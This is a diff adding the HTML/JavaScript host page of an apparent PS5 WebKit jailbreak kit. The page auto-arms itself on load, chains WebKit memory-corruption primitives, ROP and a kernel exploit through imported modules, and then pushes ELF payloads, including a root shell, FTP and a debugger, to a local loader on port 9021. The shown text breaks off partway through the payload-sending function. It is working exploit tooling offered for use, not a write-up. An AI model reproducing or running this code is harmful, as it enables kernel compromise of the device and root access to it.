@@ -1,0 +1,2473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function () {
+    var pending = [];
+    window.__jbEarly = pending;
+    function raw(tag, text) {
+        var line = "a0-rboot-s" + (pending.length + 1) + "-note-" + tag
+            + "-" + String(text).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
+        pending.push(line);
+        try {
+            var d = document.getElementById("early");
+            if (d) d.textContent += line + "\n";
+        } catch (e) { }
+    }
+    window.__jbRaw = raw;
+    window.alert = function (m) { raw("ALERT-INTERCEPTED", m); };
+    window.confirm = function (m) { raw("CONFIRM-INTERCEPTED", m); return false; };
+    window.addEventListener("error", function (e) {
+        raw("WINDOW-ERROR", (e && e.message) + "@" + (e && e.filename)
+            + ":" + (e && e.lineno));
+    });
+    window.addEventListener("unhandledrejection", function (e) {
+        raw("UNHANDLED-REJECTION",
+            e && e.reason && (e.reason.message || e.reason));
+    });
+})();
+</script>
+<title>PS5 WebKit pldmgr W2JB</title>
+<style>
+  :root {
+    --bg-primary: #070a12;
+    --bg-secondary: #0d121f;
+    --bg-card: rgba(16, 24, 40, 0.85);
+    --bg-card-hover: rgba(26, 38, 64, 0.95);
+    --border-subtle: rgba(255, 255, 255, 0.08);
+    --border-card: rgba(56, 189, 248, 0.18);
+    --ps-blue: #0070d1;
+    --ps-cyan: #38bdf8;
+    --ps-cyan-glow: rgba(56, 189, 248, 0.25);
+    --text-primary: #f1f5f9;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+    --success: #10b981;
+    --success-glow: rgba(16, 185, 129, 0.25);
+    --danger: #f43f5e;
+    --danger-glow: rgba(244, 63, 94, 0.25);
+  }
+
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg-primary);
+    background-image: 
+      radial-gradient(circle at 50% 0%, rgba(0, 112, 209, 0.18) 0%, transparent 60%),
+      radial-gradient(circle at 100% 100%, rgba(56, 189, 248, 0.08) 0%, transparent 40%);
+    color: var(--text-primary);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  #deck {
+    max-width: 820px;
+    margin: 24px auto;
+    padding: 0 18px 48px;
+  }
+
+  /* Brand Header */
+  .brand-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+    padding-bottom: 20px;
+    margin-bottom: 20px;
+    border-bottom: 1px solid var(--border-subtle);
+  }
+
+  .brand-left {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .brand-logo {
+    width: 48px;
+    height: 48px;
+    border-radius: 12px;
+    background: #000;
+    border: 1px solid var(--border-card);
+    box-shadow: 0 4px 16px var(--ps-cyan-glow);
+    object-fit: contain;
+  }
+
+  .brand-title {
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--text-primary);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .brand-badge {
+    display: inline-flex;
+    align-items: center;
+    padding: 2px 8px;
+    border-radius: 9999px;
+    font-size: 11px;
+    font-weight: 600;
+    background: rgba(56, 189, 248, 0.15);
+    color: var(--ps-cyan);
+    border: 1px solid rgba(56, 189, 248, 0.3);
+  }
+
+  .brand-sub {
+    font-size: 12px;
+    color: var(--text-muted);
+    margin-top: 2px;
+  }
+
+  .top-bar-badge {
+    font-size: 12px;
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+    padding: 6px 12px;
+    background: rgba(13, 18, 31, 0.9);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    color: var(--ps-cyan);
+  }
+
+  /* Stage Pipeline Rail */
+  .stage-rail {
+    display: flex;
+    gap: 8px;
+    margin: 16px 0;
+    overflow-x: auto;
+    padding-bottom: 4px;
+  }
+
+  .stage-chip {
+    flex: 1;
+    min-width: 100px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    padding: 8px 12px;
+    background: var(--bg-secondary);
+    border: 1px solid var(--border-subtle);
+    border-radius: 10px;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    transition: all 0.25s ease;
+  }
+
+  .stage-chip .chip-num {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.06);
+    font-size: 10px;
+    color: var(--text-secondary);
+  }
+
+  .stage-chip.on {
+    background: rgba(0, 112, 209, 0.15);
+    border-color: var(--ps-cyan);
+    color: var(--text-primary);
+    box-shadow: 0 0 16px var(--ps-cyan-glow);
+  }
+
+  .stage-chip.on .chip-num {
+    background: var(--ps-cyan);
+    color: #000;
+    font-weight: 700;
+  }
+
+  .stage-chip.done {
+    background: rgba(16, 185, 129, 0.1);
+    border-color: var(--success);
+    color: #6ee7b7;
+  }
+
+  .stage-chip.done .chip-num {
+    background: var(--success);
+    color: #000;
+  }
+
+  .stage-chip.fail {
+    background: rgba(244, 63, 94, 0.1);
+    border-color: var(--danger);
+    color: #fda4af;
+  }
+
+  /* Stage Active Card */
+  #stage {
+    margin: 16px 0 10px;
+    padding: 16px 20px;
+    background: var(--bg-card);
+    border: 1px solid var(--border-card);
+    border-left: 4px solid var(--ps-cyan);
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+    color: var(--text-primary);
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  #stage::before {
+    content: "";
+    display: inline-block;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: var(--ps-cyan);
+    box-shadow: 0 0 10px var(--ps-cyan);
+  }
+
+  #stage.ok {
+    border-color: var(--success);
+    border-left-color: var(--success);
+    color: #a7f3d0;
+  }
+
+  #stage.ok::before {
+    background: var(--success);
+    box-shadow: 0 0 10px var(--success);
+  }
+
+  #stage.bad {
+    border-color: var(--danger);
+    border-left-color: var(--danger);
+    color: #fecdd3;
+  }
+
+  #stage.bad::before {
+    background: var(--danger);
+    box-shadow: 0 0 10px var(--danger);
+  }
+
+  /* Status Ticker */
+  #liveStrip {
+    margin: 6px 0 14px;
+    padding: 8px 14px;
+    background: rgba(13, 18, 31, 0.6);
+    border-radius: 8px;
+    border: 1px solid var(--border-subtle);
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+    font-size: 12px;
+    color: var(--text-secondary);
+  }
+
+  #liveStrip .ok {
+    color: #34d399;
+  }
+
+  #liveStrip .hot {
+    color: var(--ps-cyan);
+  }
+
+  /* Status Badges & Alerts */
+  #badge {
+    display: none;
+    margin: 12px 0;
+    padding: 10px 16px;
+    background: rgba(16, 185, 129, 0.12);
+    border: 1px solid var(--success);
+    border-radius: 10px;
+    color: #6ee7b7;
+    font-size: 13px;
+    font-weight: 600;
+    text-align: center;
+    letter-spacing: 0.05em;
+  }
+
+  #badge.on {
+    display: block;
+    box-shadow: 0 0 20px var(--success-glow);
+  }
+
+  #failureMessage {
+    display: none;
+    margin: 16px 0;
+    padding: 14px 18px;
+    background: rgba(244, 63, 94, 0.12);
+    border: 1px solid var(--danger);
+    border-radius: 12px;
+    color: #fda4af;
+    font-weight: 700;
+    text-align: center;
+  }
+
+  #failureMessage.on {
+    display: block;
+    box-shadow: 0 0 24px var(--danger-glow);
+  }
+
+  #vitals, #cfg, #reboot, #verdict, #danger {
+    margin: 6px 0;
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+
+  #danger {
+    color: #fca5a5;
+  }
+
+  #reboot.fine {
+    color: #34d399;
+  }
+
+  /* Retry Inject Button */
+  #retryInject {
+    display: none;
+    width: 100%;
+    margin: 14px 0;
+    padding: 14px 20px;
+    background: linear-gradient(135deg, #e11d48, #be123c);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 4px 16px var(--danger-glow);
+  }
+
+  #retryInject.on {
+    display: block;
+  }
+
+  /* Payloads Menu */
+  #payloadMenu {
+    display: none;
+    margin-top: 24px;
+  }
+
+  #payloadMenu.on {
+    display: block;
+  }
+
+  .menuTitle {
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .menuTitle::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: var(--border-subtle);
+  }
+
+  .payloads-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 12px;
+  }
+
+  .payloadTile {
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    padding: 14px 16px;
+    background: var(--bg-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: 12px;
+    color: var(--text-primary);
+    text-decoration: none;
+    transition: all 0.2s ease;
+    cursor: pointer;
+  }
+
+  .payloadTile:hover, .payloadTile:focus {
+    background: var(--bg-card-hover);
+    border-color: var(--ps-cyan);
+    box-shadow: 0 4px 20px var(--ps-cyan-glow);
+    outline: none;
+    transform: translateY(-2px);
+  }
+
+  .payloadTile.primary {
+    border-color: rgba(56, 189, 248, 0.4);
+    background: rgba(16, 28, 54, 0.9);
+  }
+
+  .payloadTile.busy {
+    opacity: 0.45;
+    pointer-events: none;
+  }
+
+  .tile-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 6px;
+  }
+
+  .tile-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #fff;
+  }
+
+  .payloadTile .meta {
+    font-size: 11px;
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+    padding: 2px 6px;
+    background: rgba(255, 255, 255, 0.08);
+    border-radius: 6px;
+    color: var(--ps-cyan);
+  }
+
+  .tile-desc {
+    font-size: 12px;
+    color: var(--text-muted);
+    line-height: 1.4;
+  }
+
+  /* Payload Status States */
+  .payloadTile[data-state="sending"] {
+    border-color: var(--ps-cyan);
+    background: rgba(0, 112, 209, 0.15);
+  }
+
+  .payloadTile[data-state="sending"] .tile-title::after {
+    content: " (SENDING...)";
+    font-size: 11px;
+    color: var(--ps-cyan);
+  }
+
+  .payloadTile[data-state="sent"] {
+    border-color: var(--success);
+    background: rgba(16, 185, 129, 0.1);
+  }
+
+  .payloadTile[data-state="sent"] .tile-title::after {
+    content: " (READY)";
+    font-size: 11px;
+    color: var(--success);
+  }
+
+  .payloadTile[data-state="failed"] {
+    border-color: var(--danger);
+    background: rgba(244, 63, 94, 0.1);
+  }
+
+  .payloadTile[data-state="failed"] .tile-title::after {
+    content: " (FAILED)";
+    font-size: 11px;
+    color: var(--danger);
+  }
+
+  /* Diagnostics & Console */
+  .drawer-section {
+    margin-top: 24px;
+  }
+
+  .drawer-toggle {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--bg-secondary);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    color: var(--text-secondary);
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .drawer-toggle:hover {
+    background: rgba(255, 255, 255, 0.06);
+    color: var(--text-primary);
+  }
+
+  #deepDrawer {
+    display: none;
+    margin-top: 12px;
+    padding: 14px;
+    background: var(--bg-secondary);
+    border: 1px solid var(--border-subtle);
+    border-radius: 12px;
+  }
+
+  #deepDrawer.on {
+    display: block;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+  }
+
+  th {
+    border-bottom: 1px solid var(--border-subtle);
+    padding: 8px;
+    text-align: left;
+    color: var(--text-muted);
+  }
+
+  td {
+    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+    padding: 6px 8px;
+    color: var(--text-secondary);
+  }
+
+  .logs-container {
+    margin-top: 20px;
+    padding: 14px;
+    background: #04060a;
+    border: 1px solid var(--border-subtle);
+    border-radius: 12px;
+  }
+
+  .logs-header {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  #scr, #early {
+    margin: 0;
+    white-space: pre-wrap;
+    word-break: break-word;
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+    font-size: 11px;
+    line-height: 1.5;
+    color: #64748b;
+    max-height: 220px;
+    overflow-y: auto;
+  }
+
+  #scr:not(:empty) {
+    color: #94a3b8;
+    margin-top: 8px;
+    padding-top: 8px;
+    border-top: 1px dashed rgba(255, 255, 255, 0.08);
+  }
+
+  .legacy, #arm, #dt, #reactor {
+    display: none !important;
+  }
+</style>
+</head>
+<body class="quiet">
+<div id="deck">
+  <!-- Brand Header -->
+  <div class="brand-header">
+    <div class="brand-left">
+      <img src="../pldmgr.W2JB.png" alt="pldmgr" class="brand-logo" onerror="this.style.display='none'">
+      <div>
+        <div class="brand-title">
+          <span>PS5 WebKit pldmgr W2JB</span>
+          <span class="brand-badge">vLite1</span>
+        </div>
+        <div class="brand-sub">Hôte d'exploitation expérimental &middot; Autoloader pldmgr</div>
+      </div>
+    </div>
+    <div id="top-bar-text" class="top-bar-badge">PS5 Standby</div>
+  </div>
+
+  <div id="failureMessage">UNLUCKY — REDÉMARRAGE DE LA CONSOLE REQUIS</div>
+  <h1 class="legacy">poops</h1>
+  <div id="reactor" class="reactor" hidden aria-hidden="true"></div>
+  <div id="reboot"></div>
+  <div id="verdict"></div>
+  <div id="danger"></div>
+  
+  <!-- Active Stage Banner -->
+  <div id="stage">starting…</div>
+  <div id="liveStrip" aria-live="polite"></div>
+  
+  <!-- Stage Pipeline Tracker -->
+  <div class="stage-rail" id="stageRail">
+    <span class="stage-chip" data-chip="webkit"><span class="chip-num">1</span>WebKit</span>
+    <span class="stage-chip" data-chip="rop"><span class="chip-num">2</span>ROP</span>
+    <span class="stage-chip" data-chip="kernel"><span class="chip-num">3</span>Kernel</span>
+    <span class="stage-chip" data-chip="elfldr"><span class="chip-num">4</span>elfldr</span>
+    <span class="stage-chip" data-chip="pldmgr"><span class="chip-num">5</span>pldmgr</span>
+  </div>
+  
+  <div id="badge">ONLINE · GESTIONNAIRE DE PAYLOADS ACTIF</div>
+  <div id="vitals"></div>
+  <div id="cfg"></div>
+  
+  <!-- Payloads Menu -->
+  <div id="payloadMenu">
+    <div class="menuTitle">Gestionnaire de Payloads</div>
+    <div class="payloads-grid">
+      <a class="payloadTile primary" href="#" data-name="pldmgr.elf" data-key="pldmgr" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">pldmgr Autoloader</span>
+          <span class="meta">auto :9021</span>
+        </div>
+        <div class="tile-desc">Démon de chargement automatique & gestionnaire principal</div>
+      </a>
+      <a class="payloadTile" href="#" data-name="ftpsrv-ps5.elf" data-key="ftp" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">Serveur FTP</span>
+          <span class="meta">:1337</span>
+        </div>
+        <div class="tile-desc">Accès système de fichiers ultra-rapide & navigation de dossiers</div>
+      </a>
+      <a class="payloadTile" href="#" data-name="gdbsrv-ps5.elf" data-key="gdb" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">Serveur GDB</span>
+          <span class="meta">:2159</span>
+        </div>
+        <div class="tile-desc">Débogueur distant kernel et userland pour développeurs</div>
+      </a>
+      <a class="payloadTile" href="#" data-name="klogsrv-ps5.elf" data-key="klog" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">Kernel Logger</span>
+          <span class="meta">:3232</span>
+        </div>
+        <div class="tile-desc">Diffusion en temps réel des messages /dev/klog</div>
+      </a>
+      <a class="payloadTile" href="#" data-name="shsrv-ps5.elf" data-key="shell" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">Root Shell</span>
+          <span class="meta">:2323</span>
+        </div>
+        <div class="tile-desc">Session shell interactive root via TCP/Telnet</div>
+      </a>
+      <a class="payloadTile" href="#" data-name="websrv-ps5.elf" data-key="web" data-state="default">
+        <div class="tile-header">
+          <span class="tile-title">Serveur Web</span>
+          <span class="meta">:8080</span>
+        </div>
+        <div class="tile-desc">Interface d'administration HTTP embarquée</div>
+      </a>
+    </div>
+  </div>
+  
+  <button type="button" id="retryInject">RÉESSAYER L'INJECTION pldmgr</button>
+  
+  <!-- Diagnostics Drawer -->
+  <div class="drawer-section">
+    <button type="button" class="drawer-toggle" id="drawerToggle">JOURNAL SYSTÈME (DEEP LOG)</button>
+    <div id="deepDrawer">
+      <div id="wrap">
+        <table>
+          <thead><tr><th>#</th><th>test</th><th>st</th><th>result</th></tr></thead>
+          <tbody id="rows"></tbody>
+        </table>
+      </div>
+      <div id="tally"></div>
+      <div id="summary"></div>
+    </div>
+  </div>
+
+  <!-- Terminal Logs Output -->
+  <div class="logs-container">
+    <div class="logs-header">Console de Diagnostic</div>
+    <pre id="early"></pre>
+    <pre id="scr"></pre>
+  </div>
+  
+  <div id="nav"></div>
+  <div id="arm" hidden>Not armed. Redirecting…</div>
+</div>
+<div id="console" hidden></div>
+
+<script src="rop.js"></script>
+<script src="main.js?v=16"></script>
+<script>window.offsetsReady = new Promise(function (res, rej) {
+    var s = document.querySelector('script[src^="../offsets/"]');
+    if (!s) return rej(new Error("offsets script was never injected by main.js"));
+    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
+    s.addEventListener("load", function () { res(s.src); });
+    s.addEventListener("error", function () {
+        rej(new Error("offsets 404: " + s.src));
+    });
+});
+</script>
+<script src="syscalls.js"></script>
+
+<script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js?v=10";
+import { installWindowP, pairStatus } from "./mem.js?v=10";
+import { int64 } from "./int64.js";
+import { BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList }
+    from "./poops.js?v=16";
+
+let PK = null, makePoopsEngine = null, buildLadder = null;
+
+async function loadPoopsModules() {
+    const lib = await import("./poops.js?v=16");
+
+    await import("./poops.js?v=16");
+    const st = await import("./poops.js?v=16");
+    PK = lib.PK;
+    makePoopsEngine = lib.makePoopsEngine;
+    buildLadder = st.buildLadder;
+    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive");
+}
+
+const Q = new URLSearchParams(location.search);
+const ARMED = Q.get("go") === "1";
+const CLEARLATCH = Q.get("clear") === "1";
+/* Lite host: opening this page without arm params auto-starts JB */
+if (!ARMED && !CLEARLATCH) {
+    location.replace(location.pathname
+        + "?go=1&auto=1&trigger=netcontrol&payload=1&v=lite1");
+    throw new Error("redirecting to armed URL");
+}
+
+const AUTOCLEAR = Q.get("auto") === "1";
+const FROM = Q.get("from") || "";
+const ONLY = (Q.get("only") || "").split(",").map(s => s.trim()).filter(Boolean);
+const FILTERED_RUN = ONLY.length > 0 || FROM !== "";
+const MAX_ATTEMPTS = parseInt(Q.get("max") || "0", 10) || 0;
+const CORE_OVERRIDE = Q.has("core") ? parseInt(Q.get("core"), 10) : -1;
+
+const PROGRESS_KEY = "slopkit-poops:next";
+const RUNLOG_KEY = "slopkit-poops:last";
+const REV = "slopkit-poops-28-clean-success-menu";
+
+function storeGet(k) {
+    try { return sessionStorage.getItem(k) || ""; } catch { return ""; }
+}
+function storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }
+function storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }
+function storeJson(k) {
+    const raw = storeGet(k);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch { return null; }
+}
+const STALLED_AT = storeGet(PROGRESS_KEY);
+const LAST_RUN = storeJson(RUNLOG_KEY);
+
+const TRIGGER = (() => {
+    const t = (Q.get("trigger") || "none").toLowerCase();
+    return (t === "netcontrol" || t === "overflow") ? t : "none";
+})();
+const BURN = (() => {
+    const b = (Q.get("burn") || "probe").toLowerCase();
+    return (b === "none" || b === "full") ? b : "probe";
+})();
+const DEFAULT_ATTEMPTS = TRIGGER === "overflow" ? 96
+    : TRIGGER === "netcontrol" ? 8 : 1;
+
+const cfg = {
+
+    payload: Q.get("payload") || "",
+    trigger: TRIGGER,
+    burn: BURN,
+    netprobe: Q.get("netprobe") === "1",
+    sockets: Math.max(4, Math.min(128,
+        parseInt(Q.get("sockets") || "", 10) || 80)),
+    attempts: Math.max(1, Math.min(512,
+        parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
+    kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
+    kqRounds: Math.max(8, Math.min(50000,
+        parseInt(Q.get("kqrounds") || "", 10) || 5000)),
+    kqConfirm: Q.get("noconfirm") !== "1",
+    burnRounds: Math.max(1, Math.min(100000,
+        parseInt(Q.get("burnrounds") || "", 10) || 20)),
+    burnUnroll: Math.max(1, Math.min(512,
+        parseInt(Q.get("burnunroll") || "", 10) || 512)),
+
+    twinDeadlineMs: 20000,
+    reclaimDeadlineMs: 30000,
+    tripletDeadlineMs: 30000,
+    repairDeadlineMs: 30000,
+    stage0DeadlineMs: Math.max(30000, Math.min(900000,
+        parseInt(Q.get("stage0deadline") || "", 10) || 300000)),
+    stage1DeadlineMs: 120000,
+    stage2Attempts: 5,
+
+    stage2DeadlineMs: Math.max(60000, Math.min(3600000,
+        parseInt(Q.get("stage2deadline") || "", 10) || 900000))
+};
+
+let elfldrSpawned = false;
+const screenLines = [];
+
+const SCREEN_LINES = 22;
+const scrEl = document.getElementById("scr");
+
+const clean = s => String(s).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
+
+let raceMode = false;
+let screenDirty = false;
+
+const SCREEN_MS = 250;
+let lastPaint = 0;
+
+const CRITICAL_MARKS = { "TRIGGER-ARMED": 1, "LATCH-ESCALATE": 1 };
+function repaintScreen() {
+    if (!screenDirty) return;
+    screenDirty = false;
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+function setRaceMode(on) {
+    const was = raceMode;
+    raceMode = !!on;
+    if (was && !raceMode) repaintScreen();
+    return was;
+}
+function screenLine(text) {
+    screenLines.push(text.length > 120 ? text.slice(0, 117) + "..." : text);
+    if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+
+    if (raceMode) {
+        screenDirty = true;
+        const nowMs = Date.now();
+        if (nowMs - lastPaint < SCREEN_MS) return;
+        lastPaint = nowMs;
+        screenDirty = false;
+    }
+    try { scrEl.textContent = screenLines.join("\n"); } catch { }
+}
+
+const SCREEN_SHOW = /^(STAGE[1-5]-|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE)/;
+
+function screenMark(tag, extra) {
+    const s0 = extra == null ? "" : String(extra);
+    let line;
+    if (tag === "TEST") {
+
+        const m = /-why(=|%3D)/.exec(s0);
+        const i = m ? m.index : -1;
+        const head = i < 0 ? s0 : s0.slice(0, i);
+        line = head.replace(/-/, " ");
+        if (i >= 0 && /FAIL/.test(head))
+            line += ": " + s0.slice(i + m[0].length).replace(/_/g, " ");
+    } else if (tag === "TEST-ENTER") {
+
+        line = "> " + s0.replace(/-chainMarks.*$/, "").replace(/-/, " ");
+    } else if (SCREEN_SHOW.test(tag) && !tag.endsWith("-PRE")) {
+        line = s0 ? tag + " " + s0.replace(/_/g, " ") : tag;
+    } else return;
+    if (tag === "STAGE5-DONE" && /(?:^|-)joinRet=0(?:-|$)/.test(s0) &&
+        /(?:^|-)shellcodeRet=0x0+(?:-|$)/.test(s0)) {
+        elfldrSpawned = true;
+        document.body.classList.add("loader-ready");
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, "ELF LOADER READY");
+        stage("ELF LOADER READY", "ok");
+    }
+    if (line.length > 110) line = line.slice(0, 107) + "...";
+    screenLine(line);
+    catState(tag, s0);
+}
+
+function catState(tag, extra) {
+    try {
+        if (elfldrSpawned) {
+            setReactorState("ok");
+            return;
+        }
+        if (tag !== "POOPS-COMPLETE") return;
+        const m = /-fail=(\d+)/.exec(extra || "");
+        const failed = m ? parseInt(m[1], 10) : 1;
+        setReactorState(failed === 0 ? "ok" : "bad");
+    } catch (e) { }
+}
+
+let marksQueued = 0;
+let marksBlocked = 0;
+const markStats = () => ({ queued: marksQueued, blocked: marksBlocked });
+function queueEvent(tag, extra) {
+    marksQueued++;
+    screenMark(tag, extra);
+}
+function flushQueue() { repaintScreen(); }
+
+function flushMark(tag, extra) {
+
+    if (raceMode && CRITICAL_MARKS[tag] !== 1) { queueEvent(tag, extra); return; }
+    marksBlocked++;
+    screenMark(tag, extra);
+}
+
+const LATCH_KEY = "slopkit-poops:latch";
+let latchState = storeGet(LATCH_KEY) ? "held" : "clear";
+const latch = {
+    async read() {
+        const detail = storeGet(LATCH_KEY);
+        latchState = detail ? "held" : "clear";
+        return { set: detail ? 1 : 0, detail };
+    },
+    async set(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-SET", d);
+        storeSet(LATCH_KEY, d || "set");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async escalate(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-ESCALATE", d);
+        storeSet(LATCH_KEY, d || "escalated");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async clear() {
+        flushMark("LATCH-CLEAR", "operator-request");
+        storeDel(LATCH_KEY);
+        latchState = "clear";
+        return { set: 0, detail: "" };
+    }
+};
+
+const stageEl = document.getElementById("stage");
+const dangerEl = document.getElementById("danger");
+const rebootEl = document.getElementById("reboot");
+const verdictEl = document.getElementById("verdict");
+const vitalsEl = document.getElementById("vitals");
+const cfgEl = document.getElementById("cfg");
+const rowsEl = document.getElementById("rows");
+const tallyEl = document.getElementById("tally");
+const summaryEl = document.getElementById("summary");
+const navEl = document.getElementById("nav");
+const payloadMenuEl = document.getElementById("payloadMenu");
+const rowByKey = new Map();
+let payloadSendBusy = false;
+const PAYLOAD_PORT = 9021;
+const PAYLOAD_CONNECT_ATTEMPTS = 20;
+const PAYLOAD_CONNECT_GAP_MS = 150;
+const PAYLOAD_BUFFER_SIZE = 0x10000;
+const PAYLOAD_MAX_SIZE = 0x400000;
+let payloadSendStore = null;
+let payloadSockaddrStore = null;
+let payloadSocketOptionStore = null;
+let payloadSendTimeoutStore = null;
+let payloadSenderBlocked = "";
+
+function showPayloadMenu() {
+    navEl.textContent = "";
+    navEl.style.display = "none";
+    payloadMenuEl.className = "on";
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    if (tiles.length) try { tiles[0].focus(); } catch (e) { }
+}
+
+function setPayloadTileState(tile, state) {
+    if (!tile) return;
+    tile.setAttribute("data-state", state || "default");
+    const meta = tile.getElementsByClassName("meta")[0];
+    if (meta) meta.textContent = state && state !== "default" ? state : (tile.className.indexOf("primary") >= 0 ? "auto" : "aux");
+}
+
+function payloadIsListed(name) {
+    if (!/^[A-Za-z0-9._-]+\.elf$/.test(name)) return false;
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i)
+        if (tiles[i].getAttribute("data-name") === name) return true;
+    return false;
+}
+
+function payloadSyscallError(operation, result) {
+    let detail = result && result.errText
+        ? result.errText : "unknown syscall error";
+    if (result)
+        detail += " (s32=" + result.s32 + ", raw=" + result.hex + ")";
+    return new Error(operation + " failed: " + detail);
+}
+
+function preparePayloadSender() {
+    if (payloadSendStore === null)
+        payloadSendStore = mem(PAYLOAD_BUFFER_SIZE);
+    if (payloadSockaddrStore === null) {
+        payloadSockaddrStore = mem(0x10);
+        const addr = payloadSockaddrStore.u8;
+        addr.fill(0);
+        addr[0] = 0x10;
+        addr[1] = 0x02;
+        addr[2] = (PAYLOAD_PORT >>> 8) & 0xff;
+        addr[3] = PAYLOAD_PORT & 0xff;
+        addr[4] = 127;
+        addr[5] = 0;
+        addr[6] = 0;
+        addr[7] = 1;
+    }
+    if (payloadSocketOptionStore === null) {
+        payloadSocketOptionStore = mem(4);
+        payloadSocketOptionStore.u8.fill(0);
+        payloadSocketOptionStore.u8[0] = 1;
+    }
+    if (payloadSendTimeoutStore === null) {
+        payloadSendTimeoutStore = mem(0x10);
+        payloadSendTimeoutStore.u8.fill(0);
+        payloadSendTimeoutStore.u8[0] = 15;
+    }
+}
+
+async function sendPayloadToElfldr(name) {
+    if (!elfldrSpawned)
+        throw new Error("ELF loader is not ready");
+    if (!P || !chain)
+        throw new Error("the post-jailbreak ROP runtime is unavailable");
+    if (chainDead)
+        throw new Error("the ROP chain is unusable after " + chainDead);
+    if (payloadSenderBlocked)
+        throw new Error(payloadSenderBlocked);
+    if (!payloadIsListed(name))
+        throw new Error("payload is not listed in this menu");
+
+    const response = await fetch("../payloads/" + encodeURIComponent(name),
+        { cache: "no-store" });
+    if (!response.ok)
+        throw new Error("payload fetch failed: HTTP " + response.status);
+    const bytes = new Uint8Array(await response.arrayBuffer());
+    if (!bytes.length)
+        throw new Error("payload is empty");
+    if (bytes.length > PAYLOAD_MAX_SIZE)
+        throw new Error("payload is larger than the 4 MiB limit");
+    if (bytes.length < 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45
+        || bytes[2] !== 0x4c || bytes[3] !== 0x46)
+        throw new Error("payload does not start with the ELF signature");
+
+    preparePayloadSender();
+    let fd = -1;
+    let sent = 0;
+    let failure = null;
+    let closeWarning = null;
